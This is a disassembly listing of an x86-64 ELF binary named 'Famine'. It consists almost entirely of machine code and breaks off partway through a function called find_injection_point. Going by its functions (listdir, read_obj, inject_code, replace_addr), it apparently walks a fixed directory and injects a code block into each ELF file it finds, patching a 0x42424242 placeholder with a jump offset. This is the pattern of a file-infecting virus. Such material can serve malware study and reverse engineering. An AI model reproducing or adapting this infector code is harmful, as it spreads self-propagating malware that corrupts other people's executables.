
Famine:     file format elf64-x86-64


Disassembly of section .init:

0000000000001000 <_init>:
    1000:	f3 0f 1e fa          	endbr64 
    1004:	48 83 ec 08          	sub    $0x8,%rsp
    1008:	48 8b 05 99 4f 00 00 	mov    0x4f99(%rip),%rax        # 5fa8 <__gmon_start__@Base>
    100f:	48 85 c0             	test   %rax,%rax
    1012:	74 02                	je     1016 <_init+0x16>
    1014:	ff d0                	call   *%rax
    1016:	48 83 c4 08          	add    $0x8,%rsp
    101a:	c3                   	ret    

Disassembly of section .plt:

0000000000001020 <.plt>:
    1020:	ff 35 02 4f 00 00    	push   0x4f02(%rip)        # 5f28 <_GLOBAL_OFFSET_TABLE_+0x8>
    1026:	f2 ff 25 03 4f 00 00 	bnd jmp *0x4f03(%rip)        # 5f30 <_GLOBAL_OFFSET_TABLE_+0x10>
    102d:	0f 1f 00             	nopl   (%rax)

Disassembly of section .plt.got:

0000000000001030 <__cxa_finalize@plt>:
    1030:	f3 0f 1e fa          	endbr64 
    1034:	f2 ff 25 bd 4f 00 00 	bnd jmp *0x4fbd(%rip)        # 5ff8 <__cxa_finalize@GLIBC_2.2.5>
    103b:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)

Disassembly of section .text:

0000000000001040 <_start>:
    1040:	f3 0f 1e fa          	endbr64 
    1044:	31 ed                	xor    %ebp,%ebp
    1046:	49 89 d1             	mov    %rdx,%r9
    1049:	5e                   	pop    %rsi
    104a:	48 89 e2             	mov    %rsp,%rdx
    104d:	48 83 e4 f0          	and    $0xfffffffffffffff0,%rsp
    1051:	50                   	push   %rax
    1052:	54                   	push   %rsp
    1053:	45 31 c0             	xor    %r8d,%r8d
    1056:	31 c9                	xor    %ecx,%ecx
    1058:	48 8d 3d 36 04 00 00 	lea    0x436(%rip),%rdi        # 1495 <main>
    105f:	ff 15 e3 4e 00 00    	call   *0x4ee3(%rip)        # 5f48 <__libc_start_main@GLIBC_2.34>
    1065:	f4                   	hlt    
    1066:	66 2e 0f 1f 84 00 00 	cs nopw 0x0(%rax,%rax,1)
    106d:	00 00 00 

0000000000001070 <deregister_tm_clones>:
    1070:	48 8d 3d 99 4f 00 00 	lea    0x4f99(%rip),%rdi        # 6010 <__TMC_END__>
    1077:	48 8d 05 92 4f 00 00 	lea    0x4f92(%rip),%rax        # 6010 <__TMC_END__>
    107e:	48 39 f8             	cmp    %rdi,%rax
    1081:	74 15                	je     1098 <deregister_tm_clones+0x28>
    1083:	48 8b 05 c6 4e 00 00 	mov    0x4ec6(%rip),%rax        # 5f50 <_ITM_deregisterTMCloneTable@Base>
    108a:	48 85 c0             	test   %rax,%rax
    108d:	74 09                	je     1098 <deregister_tm_clones+0x28>
    108f:	ff e0                	jmp    *%rax
    1091:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
    1098:	c3                   	ret    
    1099:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)

00000000000010a0 <register_tm_clones>:
    10a0:	48 8d 3d 69 4f 00 00 	lea    0x4f69(%rip),%rdi        # 6010 <__TMC_END__>
    10a7:	48 8d 35 62 4f 00 00 	lea    0x4f62(%rip),%rsi        # 6010 <__TMC_END__>
    10ae:	48 29 fe             	sub    %rdi,%rsi
    10b1:	48 89 f0             	mov    %rsi,%rax
    10b4:	48 c1 ee 3f          	shr    $0x3f,%rsi
    10b8:	48 c1 f8 03          	sar    $0x3,%rax
    10bc:	48 01 c6             	add    %rax,%rsi
    10bf:	48 d1 fe             	sar    %rsi
    10c2:	74 14                	je     10d8 <register_tm_clones+0x38>
    10c4:	48 8b 05 1d 4f 00 00 	mov    0x4f1d(%rip),%rax        # 5fe8 <_ITM_registerTMCloneTable@Base>
    10cb:	48 85 c0             	test   %rax,%rax
    10ce:	74 08                	je     10d8 <register_tm_clones+0x38>
    10d0:	ff e0                	jmp    *%rax
    10d2:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
    10d8:	c3                   	ret    
    10d9:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)

00000000000010e0 <__do_global_dtors_aux>:
    10e0:	f3 0f 1e fa          	endbr64 
    10e4:	80 3d 25 4f 00 00 00 	cmpb   $0x0,0x4f25(%rip)        # 6010 <__TMC_END__>
    10eb:	75 2b                	jne    1118 <__do_global_dtors_aux+0x38>
    10ed:	55                   	push   %rbp
    10ee:	48 83 3d 02 4f 00 00 	cmpq   $0x0,0x4f02(%rip)        # 5ff8 <__cxa_finalize@GLIBC_2.2.5>
    10f5:	00 
    10f6:	48 89 e5             	mov    %rsp,%rbp
    10f9:	74 0c                	je     1107 <__do_global_dtors_aux+0x27>
    10fb:	48 8b 3d 06 4f 00 00 	mov    0x4f06(%rip),%rdi        # 6008 <__dso_handle>
    1102:	e8 29 ff ff ff       	call   1030 <__cxa_finalize@plt>
    1107:	e8 64 ff ff ff       	call   1070 <deregister_tm_clones>
    110c:	c6 05 fd 4e 00 00 01 	movb   $0x1,0x4efd(%rip)        # 6010 <__TMC_END__>
    1113:	5d                   	pop    %rbp
    1114:	c3                   	ret    
    1115:	0f 1f 00             	nopl   (%rax)
    1118:	c3                   	ret    
    1119:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)

0000000000001120 <frame_dummy>:
    1120:	f3 0f 1e fa          	endbr64 
    1124:	e9 77 ff ff ff       	jmp    10a0 <register_tm_clones>

0000000000001129 <clear_env>:
    1129:	f3 0f 1e fa          	endbr64 
    112d:	55                   	push   %rbp
    112e:	48 89 e5             	mov    %rsp,%rbp
    1131:	48 83 ec 10          	sub    $0x10,%rsp
    1135:	48 89 7d f8          	mov    %rdi,-0x8(%rbp)
    1139:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
    113d:	48 8b 40 10          	mov    0x10(%rax),%rax
    1141:	48 85 c0             	test   %rax,%rax
    1144:	74 11                	je     1157 <clear_env+0x2e>
    1146:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
    114a:	48 8b 40 10          	mov    0x10(%rax),%rax
    114e:	48 89 c7             	mov    %rax,%rdi
    1151:	ff 15 e1 4d 00 00    	call   *0x4de1(%rip)        # 5f38 <free@GLIBC_2.2.5>
    1157:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
    115b:	48 8b 40 20          	mov    0x20(%rax),%rax
    115f:	48 85 c0             	test   %rax,%rax
    1162:	74 11                	je     1175 <clear_env+0x4c>
    1164:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
    1168:	48 8b 40 20          	mov    0x20(%rax),%rax
    116c:	48 89 c7             	mov    %rax,%rdi
    116f:	ff 15 c3 4d 00 00    	call   *0x4dc3(%rip)        # 5f38 <free@GLIBC_2.2.5>
    1175:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
    1179:	48 8b 40 08          	mov    0x8(%rax),%rax
    117d:	48 85 c0             	test   %rax,%rax
    1180:	74 11                	je     1193 <clear_env+0x6a>
    1182:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
    1186:	48 8b 40 08          	mov    0x8(%rax),%rax
    118a:	48 89 c7             	mov    %rax,%rdi
    118d:	ff 15 a5 4d 00 00    	call   *0x4da5(%rip)        # 5f38 <free@GLIBC_2.2.5>
    1193:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
    1197:	48 89 c7             	mov    %rax,%rdi
    119a:	ff 15 98 4d 00 00    	call   *0x4d98(%rip)        # 5f38 <free@GLIBC_2.2.5>
    11a0:	90                   	nop
    11a1:	c9                   	leave  
    11a2:	c3                   	ret    

00000000000011a3 <set_env>:
    11a3:	f3 0f 1e fa          	endbr64 
    11a7:	55                   	push   %rbp
    11a8:	48 89 e5             	mov    %rsp,%rbp
    11ab:	48 83 ec 10          	sub    $0x10,%rsp
    11af:	48 c7 45 f8 00 00 00 	movq   $0x0,-0x8(%rbp)
    11b6:	00 
    11b7:	bf 60 00 00 00       	mov    $0x60,%edi
    11bc:	ff 15 fe 4d 00 00    	call   *0x4dfe(%rip)        # 5fc0 <malloc@GLIBC_2.2.5>
    11c2:	48 89 45 f8          	mov    %rax,-0x8(%rbp)
    11c6:	48 83 7d f8 00       	cmpq   $0x0,-0x8(%rbp)
    11cb:	75 1a                	jne    11e7 <set_env+0x44>
    11cd:	48 8d 05 34 2e 00 00 	lea    0x2e34(%rip),%rax        # 4008 <_IO_stdin_used+0x8>
    11d4:	48 89 c7             	mov    %rax,%rdi
    11d7:	ff 15 83 4d 00 00    	call   *0x4d83(%rip)        # 5f60 <puts@GLIBC_2.2.5>
    11dd:	b8 00 00 00 00       	mov    $0x0,%eax
    11e2:	e9 ba 00 00 00       	jmp    12a1 <set_env+0xfe>
    11e7:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
    11eb:	48 c7 00 00 00 00 00 	movq   $0x0,(%rax)
    11f2:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
    11f6:	48 c7 40 08 00 00 00 	movq   $0x0,0x8(%rax)
    11fd:	00 
    11fe:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
    1202:	48 c7 40 10 00 00 00 	movq   $0x0,0x10(%rax)
    1209:	00 
    120a:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
    120e:	c7 40 38 00 00 00 00 	movl   $0x0,0x38(%rax)
    1215:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
    1219:	c7 40 3c 00 00 00 00 	movl   $0x0,0x3c(%rax)
    1220:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
    1224:	c7 40 40 00 00 00 00 	movl   $0x0,0x40(%rax)
    122b:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
    122f:	48 c7 40 18 00 00 00 	movq   $0x0,0x18(%rax)
    1236:	00 
    1237:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
    123b:	48 c7 40 20 00 00 00 	movq   $0x0,0x20(%rax)
    1242:	00 
    1243:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
    1247:	48 c7 40 28 00 00 00 	movq   $0x0,0x28(%rax)
    124e:	00 
    124f:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
    1253:	48 c7 40 30 00 00 00 	movq   $0x0,0x30(%rax)
    125a:	00 
    125b:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
    125f:	c7 40 50 00 00 00 00 	movl   $0x0,0x50(%rax)
    1266:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
    126a:	c7 40 4c 00 00 00 00 	movl   $0x0,0x4c(%rax)
    1271:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
    1275:	c7 40 54 00 00 00 00 	movl   $0x0,0x54(%rax)
    127c:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
    1280:	c7 40 58 00 00 00 00 	movl   $0x0,0x58(%rax)
    1287:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
    128b:	c7 40 44 00 00 00 00 	movl   $0x0,0x44(%rax)
    1292:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
    1296:	c7 40 48 00 00 00 00 	movl   $0x0,0x48(%rax)
    129d:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
    12a1:	c9                   	leave  
    12a2:	c3                   	ret    

00000000000012a3 <listdir>:
    12a3:	f3 0f 1e fa          	endbr64 
    12a7:	55                   	push   %rbp
    12a8:	48 89 e5             	mov    %rsp,%rbp
    12ab:	53                   	push   %rbx
    12ac:	48 83 ec 38          	sub    $0x38,%rsp
    12b0:	48 89 7d c8          	mov    %rdi,-0x38(%rbp)
    12b4:	c7 45 ec 00 00 00 00 	movl   $0x0,-0x14(%rbp)
    12bb:	48 8b 45 c8          	mov    -0x38(%rbp),%rax
    12bf:	ba 00 08 09 00       	mov    $0x90800,%edx
    12c4:	48 89 c6             	mov    %rax,%rsi
    12c7:	bf 9c ff ff ff       	mov    $0xffffff9c,%edi
    12cc:	67 e8 73 21 00 00    	addr32 call 3445 <syscall_openat>
    12d2:	89 45 e8             	mov    %eax,-0x18(%rbp)
    12d5:	83 7d e8 00          	cmpl   $0x0,-0x18(%rbp)
    12d9:	0f 8e ab 01 00 00    	jle    148a <listdir+0x1e7>
    12df:	bf 18 01 00 00       	mov    $0x118,%edi
    12e4:	ff 15 d6 4c 00 00    	call   *0x4cd6(%rip)        # 5fc0 <malloc@GLIBC_2.2.5>
    12ea:	48 89 45 e0          	mov    %rax,-0x20(%rbp)
    12ee:	48 83 7d e0 00       	cmpq   $0x0,-0x20(%rbp)
    12f3:	0f 85 5a 01 00 00    	jne    1453 <listdir+0x1b0>
    12f9:	48 8d 05 08 2d 00 00 	lea    0x2d08(%rip),%rax        # 4008 <_IO_stdin_used+0x8>
    1300:	48 89 c7             	mov    %rax,%rdi
    1303:	ff 15 57 4c 00 00    	call   *0x4c57(%rip)        # 5f60 <puts@GLIBC_2.2.5>
    1309:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
    130e:	e9 7c 01 00 00       	jmp    148f <listdir+0x1ec>
    1313:	48 8b 45 e0          	mov    -0x20(%rbp),%rax
    1317:	48 83 c0 12          	add    $0x12,%rax
    131b:	48 8d 15 04 2d 00 00 	lea    0x2d04(%rip),%rdx        # 4026 <_IO_stdin_used+0x26>
    1322:	48 89 d6             	mov    %rdx,%rsi
    1325:	48 89 c7             	mov    %rax,%rdi
    1328:	ff 15 72 4c 00 00    	call   *0x4c72(%rip)        # 5fa0 <strcmp@GLIBC_2.2.5>
    132e:	85 c0                	test   %eax,%eax
    1330:	0f 84 1d 01 00 00    	je     1453 <listdir+0x1b0>
    1336:	48 8b 45 e0          	mov    -0x20(%rbp),%rax
    133a:	48 83 c0 12          	add    $0x12,%rax
    133e:	48 8d 15 e3 2c 00 00 	lea    0x2ce3(%rip),%rdx        # 4028 <_IO_stdin_used+0x28>
    1345:	48 89 d6             	mov    %rdx,%rsi
    1348:	48 89 c7             	mov    %rax,%rdi
    134b:	ff 15 4f 4c 00 00    	call   *0x4c4f(%rip)        # 5fa0 <strcmp@GLIBC_2.2.5>
    1351:	85 c0                	test   %eax,%eax
    1353:	0f 84 fa 00 00 00    	je     1453 <listdir+0x1b0>
    1359:	48 c7 45 d8 00 00 00 	movq   $0x0,-0x28(%rbp)
    1360:	00 
    1361:	b8 00 00 00 00       	mov    $0x0,%eax
    1366:	67 e8 37 fe ff ff    	addr32 call 11a3 <set_env>
    136c:	48 89 45 d8          	mov    %rax,-0x28(%rbp)
    1370:	48 83 7d d8 00       	cmpq   $0x0,-0x28(%rbp)
    1375:	75 0a                	jne    1381 <listdir+0xde>
    1377:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
    137c:	e9 0e 01 00 00       	jmp    148f <listdir+0x1ec>
    1381:	48 8b 45 c8          	mov    -0x38(%rbp),%rax
    1385:	48 89 c7             	mov    %rax,%rdi
    1388:	ff 15 e2 4b 00 00    	call   *0x4be2(%rip)        # 5f70 <strlen@GLIBC_2.2.5>
    138e:	89 c3                	mov    %eax,%ebx
    1390:	48 8b 45 e0          	mov    -0x20(%rbp),%rax
    1394:	48 83 c0 12          	add    $0x12,%rax
    1398:	48 89 c7             	mov    %rax,%rdi
    139b:	ff 15 cf 4b 00 00    	call   *0x4bcf(%rip)        # 5f70 <strlen@GLIBC_2.2.5>
    13a1:	01 d8                	add    %ebx,%eax
    13a3:	83 c0 01             	add    $0x1,%eax
    13a6:	89 45 ec             	mov    %eax,-0x14(%rbp)
    13a9:	8b 45 ec             	mov    -0x14(%rbp),%eax
    13ac:	48 98                	cltq   
    13ae:	48 89 c7             	mov    %rax,%rdi
    13b1:	ff 15 09 4c 00 00    	call   *0x4c09(%rip)        # 5fc0 <malloc@GLIBC_2.2.5>
    13b7:	48 89 c2             	mov    %rax,%rdx
    13ba:	48 8b 45 d8          	mov    -0x28(%rbp),%rax
    13be:	48 89 50 08          	mov    %rdx,0x8(%rax)
    13c2:	48 8b 45 d8          	mov    -0x28(%rbp),%rax
    13c6:	48 8b 40 08          	mov    0x8(%rax),%rax
    13ca:	48 85 c0             	test   %rax,%rax
    13cd:	75 1a                	jne    13e9 <listdir+0x146>
    13cf:	48 8d 05 32 2c 00 00 	lea    0x2c32(%rip),%rax        # 4008 <_IO_stdin_used+0x8>
    13d6:	48 89 c7             	mov    %rax,%rdi
    13d9:	ff 15 81 4b 00 00    	call   *0x4b81(%rip)        # 5f60 <puts@GLIBC_2.2.5>
    13df:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
    13e4:	e9 a6 00 00 00       	jmp    148f <listdir+0x1ec>
    13e9:	8b 45 ec             	mov    -0x14(%rbp),%eax
    13ec:	48 63 d0             	movslq %eax,%rdx
    13ef:	48 8b 45 d8          	mov    -0x28(%rbp),%rax
    13f3:	48 8b 40 08          	mov    0x8(%rax),%rax
    13f7:	be 00 00 00 00       	mov    $0x0,%esi
    13fc:	48 89 c7             	mov    %rax,%rdi
    13ff:	ff 15 8b 4b 00 00    	call   *0x4b8b(%rip)        # 5f90 <memset@GLIBC_2.2.5>
    1405:	48 8b 45 d8          	mov    -0x28(%rbp),%rax
    1409:	48 8b 40 08          	mov    0x8(%rax),%rax
    140d:	48 8b 55 c8          	mov    -0x38(%rbp),%rdx
    1411:	48 89 d6             	mov    %rdx,%rsi
    1414:	48 89 c7             	mov    %rax,%rdi
    1417:	ff 15 3b 4b 00 00    	call   *0x4b3b(%rip)        # 5f58 <strcpy@GLIBC_2.2.5>
    141d:	48 8b 45 e0          	mov    -0x20(%rbp),%rax
    1421:	48 8d 50 12          	lea    0x12(%rax),%rdx
    1425:	48 8b 45 d8          	mov    -0x28(%rbp),%rax
    1429:	48 8b 40 08          	mov    0x8(%rax),%rax
    142d:	48 89 d6             	mov    %rdx,%rsi
    1430:	48 89 c7             	mov    %rax,%rdi
    1433:	ff 15 a7 4b 00 00    	call   *0x4ba7(%rip)        # 5fe0 <strcat@GLIBC_2.2.5>
    1439:	48 8b 45 d8          	mov    -0x28(%rbp),%rax
    143d:	48 89 c7             	mov    %rax,%rdi
    1440:	67 e8 e7 0d 00 00    	addr32 call 222d <read_obj>
    1446:	48 8b 45 d8          	mov    -0x28(%rbp),%rax
    144a:	48 89 c7             	mov    %rax,%rdi
    144d:	67 e8 d6 fc ff ff    	addr32 call 1129 <clear_env>
    1453:	8b 45 e8             	mov    -0x18(%rbp),%eax
    1456:	48 8b 4d e0          	mov    -0x20(%rbp),%rcx
    145a:	ba 18 01 00 00       	mov    $0x118,%edx
    145f:	48 89 ce             	mov    %rcx,%rsi
    1462:	89 c7                	mov    %eax,%edi
    1464:	67 e8 06 20 00 00    	addr32 call 3470 <syscall_getdents>
    146a:	85 c0                	test   %eax,%eax
    146c:	0f 8f a1 fe ff ff    	jg     1313 <listdir+0x70>
    1472:	48 8b 45 e0          	mov    -0x20(%rbp),%rax
    1476:	48 89 c7             	mov    %rax,%rdi
    1479:	ff 15 b9 4a 00 00    	call   *0x4ab9(%rip)        # 5f38 <free@GLIBC_2.2.5>
    147f:	8b 45 e8             	mov    -0x18(%rbp),%eax
    1482:	89 c7                	mov    %eax,%edi
    1484:	ff 15 0e 4b 00 00    	call   *0x4b0e(%rip)        # 5f98 <close@GLIBC_2.2.5>
    148a:	b8 00 00 00 00       	mov    $0x0,%eax
    148f:	48 8b 5d f8          	mov    -0x8(%rbp),%rbx
    1493:	c9                   	leave  
    1494:	c3                   	ret    

0000000000001495 <main>:
    1495:	f3 0f 1e fa          	endbr64 
    1499:	55                   	push   %rbp
    149a:	48 89 e5             	mov    %rsp,%rbp
    149d:	48 83 ec 10          	sub    $0x10,%rsp
    14a1:	48 8d 05 88 2b 00 00 	lea    0x2b88(%rip),%rax        # 4030 <_IO_stdin_used+0x30>
    14a8:	48 89 45 f8          	mov    %rax,-0x8(%rbp)
    14ac:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
    14b0:	ba 27 00 00 00       	mov    $0x27,%edx
    14b5:	48 89 c6             	mov    %rax,%rsi
    14b8:	bf 01 00 00 00       	mov    $0x1,%edi
    14bd:	67 e8 57 1f 00 00    	addr32 call 341a <syscall_write>
    14c3:	48 8d 05 8e 2b 00 00 	lea    0x2b8e(%rip),%rax        # 4058 <_IO_stdin_used+0x58>
    14ca:	48 89 c7             	mov    %rax,%rdi
    14cd:	67 e8 d0 fd ff ff    	addr32 call 12a3 <listdir>
    14d3:	b8 00 00 00 00       	mov    $0x0,%eax
    14d8:	c9                   	leave  
    14d9:	c3                   	ret    

00000000000014da <replace_addr>:
    14da:	f3 0f 1e fa          	endbr64 
    14de:	55                   	push   %rbp
    14df:	48 89 e5             	mov    %rsp,%rbp
    14e2:	48 89 7d e8          	mov    %rdi,-0x18(%rbp)
    14e6:	89 75 e4             	mov    %esi,-0x1c(%rbp)
    14e9:	89 55 e0             	mov    %edx,-0x20(%rbp)
    14ec:	89 4d dc             	mov    %ecx,-0x24(%rbp)
    14ef:	48 c7 45 f8 00 00 00 	movq   $0x0,-0x8(%rbp)
    14f6:	00 
    14f7:	c7 45 f4 00 00 00 00 	movl   $0x0,-0xc(%rbp)
    14fe:	48 c7 45 f8 00 00 00 	movq   $0x0,-0x8(%rbp)
    1505:	00 
    1506:	e9 d5 00 00 00       	jmp    15e0 <replace_addr+0x106>
    150b:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
    150f:	48 8d 14 c5 00 00 00 	lea    0x0(,%rax,8),%rdx
    1516:	00 
    1517:	48 8b 45 e8          	mov    -0x18(%rbp),%rax
    151b:	48 8b 40 28          	mov    0x28(%rax),%rax
    151f:	48 39 c2             	cmp    %rax,%rdx
    1522:	0f 83 b3 00 00 00    	jae    15db <replace_addr+0x101>
    1528:	c7 45 f0 00 00 00 00 	movl   $0x0,-0x10(%rbp)
    152f:	c7 45 f4 00 00 00 00 	movl   $0x0,-0xc(%rbp)
    1536:	eb 58                	jmp    1590 <replace_addr+0xb6>
    1538:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
    153c:	48 8d 14 c5 00 00 00 	lea    0x0(,%rax,8),%rdx
    1543:	00 
    1544:	8b 45 f4             	mov    -0xc(%rbp),%eax
    1547:	48 98                	cltq   
    1549:	48 01 d0             	add    %rdx,%rax
    154c:	48 8d 50 04          	lea    0x4(%rax),%rdx
    1550:	48 8b 45 e8          	mov    -0x18(%rbp),%rax
    1554:	48 8b 40 28          	mov    0x28(%rax),%rax
    1558:	48 39 c2             	cmp    %rax,%rdx
    155b:	73 2f                	jae    158c <replace_addr+0xb2>
    155d:	48 8b 45 e8          	mov    -0x18(%rbp),%rax
    1561:	48 8b 50 20          	mov    0x20(%rax),%rdx
    1565:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
    1569:	48 8d 0c c5 00 00 00 	lea    0x0(,%rax,8),%rcx
    1570:	00 
    1571:	8b 45 f4             	mov    -0xc(%rbp),%eax
    1574:	48 98                	cltq   
    1576:	48 01 c8             	add    %rcx,%rax
    1579:	48 01 d0             	add    %rdx,%rax
    157c:	8b 00                	mov    (%rax),%eax
    157e:	39 45 e4             	cmp    %eax,-0x1c(%rbp)
    1581:	75 09                	jne    158c <replace_addr+0xb2>
    1583:	c7 45 f0 01 00 00 00 	movl   $0x1,-0x10(%rbp)
    158a:	eb 0a                	jmp    1596 <replace_addr+0xbc>
    158c:	83 45 f4 01          	addl   $0x1,-0xc(%rbp)
    1590:	83 7d f4 07          	cmpl   $0x7,-0xc(%rbp)
    1594:	7e a2                	jle    1538 <replace_addr+0x5e>
    1596:	83 7d f0 00          	cmpl   $0x0,-0x10(%rbp)
    159a:	74 3f                	je     15db <replace_addr+0x101>
    159c:	83 7d dc 01          	cmpl   $0x1,-0x24(%rbp)
    15a0:	75 13                	jne    15b5 <replace_addr+0xdb>
    15a2:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
    15a6:	8d 14 c5 00 00 00 00 	lea    0x0(,%rax,8),%edx
    15ad:	8b 45 f4             	mov    -0xc(%rbp),%eax
    15b0:	01 d0                	add    %edx,%eax
    15b2:	29 45 e0             	sub    %eax,-0x20(%rbp)
    15b5:	48 8b 45 e8          	mov    -0x18(%rbp),%rax
    15b9:	48 8b 50 20          	mov    0x20(%rax),%rdx
    15bd:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
    15c1:	48 8d 0c c5 00 00 00 	lea    0x0(,%rax,8),%rcx
    15c8:	00 
    15c9:	8b 45 f4             	mov    -0xc(%rbp),%eax
    15cc:	48 98                	cltq   
    15ce:	48 01 c8             	add    %rcx,%rax
    15d1:	48 01 c2             	add    %rax,%rdx
    15d4:	8b 45 e0             	mov    -0x20(%rbp),%eax
    15d7:	89 02                	mov    %eax,(%rdx)
    15d9:	eb 17                	jmp    15f2 <replace_addr+0x118>
    15db:	48 83 45 f8 01       	addq   $0x1,-0x8(%rbp)
    15e0:	48 8b 45 e8          	mov    -0x18(%rbp),%rax
    15e4:	48 8b 40 28          	mov    0x28(%rax),%rax
    15e8:	48 39 45 f8          	cmp    %rax,-0x8(%rbp)
    15ec:	0f 82 19 ff ff ff    	jb     150b <replace_addr+0x31>
    15f2:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
    15f6:	8d 14 c5 00 00 00 00 	lea    0x0(,%rax,8),%edx
    15fd:	8b 45 f4             	mov    -0xc(%rbp),%eax
    1600:	01 d0                	add    %edx,%eax
    1602:	5d                   	pop    %rbp
    1603:	c3                   	ret    

0000000000001604 <inject_code>:
    1604:	f3 0f 1e fa          	endbr64 
    1608:	55                   	push   %rbp
    1609:	48 89 e5             	mov    %rsp,%rbp
    160c:	48 83 ec 20          	sub    $0x20,%rsp
    1610:	48 89 7d e8          	mov    %rdi,-0x18(%rbp)
    1614:	48 8b 45 e8          	mov    -0x18(%rbp),%rax
    1618:	8b 50 48             	mov    0x48(%rax),%edx
    161b:	48 8b 45 e8          	mov    -0x18(%rbp),%rax
    161f:	8b 40 4c             	mov    0x4c(%rax),%eax
    1622:	01 c2                	add    %eax,%edx
    1624:	48 8b 45 e8          	mov    -0x18(%rbp),%rax
    1628:	48 8b 40 10          	mov    0x10(%rax),%rax
    162c:	89 d2                	mov    %edx,%edx
    162e:	48 89 50 18          	mov    %rdx,0x18(%rax)
    1632:	48 8b 45 e8          	mov    -0x18(%rbp),%rax
    1636:	8b 50 48             	mov    0x48(%rax),%edx
    1639:	48 8b 45 e8          	mov    -0x18(%rbp),%rax
    163d:	8b 48 50             	mov    0x50(%rax),%ecx
    1640:	89 d0                	mov    %edx,%eax
    1642:	29 c8                	sub    %ecx,%eax
    1644:	89 45 fc             	mov    %eax,-0x4(%rbp)
    1647:	8b 45 fc             	mov    -0x4(%rbp),%eax
    164a:	f7 d8                	neg    %eax
    164c:	89 c2                	mov    %eax,%edx
    164e:	48 8b 45 e8          	mov    -0x18(%rbp),%rax
    1652:	b9 01 00 00 00       	mov    $0x1,%ecx
    1657:	be 42 42 42 42       	mov    $0x42424242,%esi
    165c:	48 89 c7             	mov    %rax,%rdi
    165f:	e8 76 fe ff ff       	call   14da <replace_addr>
    1664:	48 8b 45 e8          	mov    -0x18(%rbp),%rax
    1668:	48 8b 50 28          	mov    0x28(%rax),%rdx
    166c:	48 8b 45 e8          	mov    -0x18(%rbp),%rax
    1670:	48 8b 40 20          	mov    0x20(%rax),%rax
    1674:	48 8b 4d e8          	mov    -0x18(%rbp),%rcx
    1678:	48 8b 71 10          	mov    0x10(%rcx),%rsi
    167c:	48 8b 4d e8          	mov    -0x18(%rbp),%rcx
    1680:	8b 49 44             	mov    0x44(%rcx),%ecx
    1683:	89 c9                	mov    %ecx,%ecx
    1685:	48 01 f1             	add    %rsi,%rcx
    1688:	48 89 c6             	mov    %rax,%rsi
    168b:	48 89 cf             	mov    %rcx,%rdi
    168e:	ff 15 3c 49 00 00    	call   *0x493c(%rip)        # 5fd0 <memmove@GLIBC_2.2.5>
    1694:	90                   	nop
    1695:	c9                   	leave  
    1696:	c3                   	ret    

0000000000001697 <find_injection_point>:
    1697:	f3 0f 1e fa          	endbr64 
    169b:	55                   	push   %rbp
    169c:	48 89 e5             	mov    %rsp,%rbp
    169f:	48 83 ec 70          	sub    $0x70,%rsp
    16a3:	48 89 7d 98          	mov    %rdi,-0x68(%rbp)
    16a7:	48 8b 45 98          	mov    -0x68(%rbp),%rax
    16ab:	48 8b 00             	mov    (%rax),%rax
    16ae:	48 89 45 e0          	mov    %rax,-0x20(%rbp)
    16b2:	48 8b 45 e0          	mov    -0x20(%rbp),%rax
    16b6:	0f b7 40 3c          	movzwl 0x3c(%rax),%eax
    16ba:	0f b7 c0             	movzwl %ax,%eax
    16bd:	89 45 dc             	mov    %eax,-0x24(%rbp)
    16c0:	48 8b 45 98          	mov    -0x68(%rbp),%rax
    16c4:	48 8b 10             	mov    (%rax),%rdx
    16c7:	48 8b 45 e0          	mov    -0x20(%rbp),%rax
    16cb:	48 8b 40 28          	mov    0x28(%rax),%rax
    16cf:	48 01 d0             	add    %rdx,%rax
    16d2:	48 89 45 d0          	mov    %rax,-0x30(%rbp)
    16d6:	48 8b 45 e0          	mov    -0x20(%rbp),%rax
    16da:	0f b7 40 38          	movzwl 0x38(%rax),%eax
    16de:	0f b7 c0             	movzwl %ax,%eax
    16e1:	89 45 cc             	mov    %eax,-0x34(%rbp)
    16e4:	48 8b 45 98          	mov    -0x68(%rbp),%rax
    16e8:	48 8b 10             	mov    (%rax),%rdx
    16eb:	48 8b 45 e0          	mov    -0x20(%rbp),%rax
    16ef:	48 8b 40 20          	mov    0x20(%rax),%rax
    16f3:	48 01 d0             	add    %rdx,%rax
    16f6:	48 89 45 c0          	mov    %rax,-0x40(%rbp)
    16fa:	48 8b 45 e0          	mov    -0x20(%rbp),%rax
    16fe:	0f b7 40 3e          	movzwl 0x3e(%rax),%eax
    1702:	0f b7 c0             	movzwl %ax,%eax
    1705:	48 c1 e0 06          	shl    $0x6,%rax
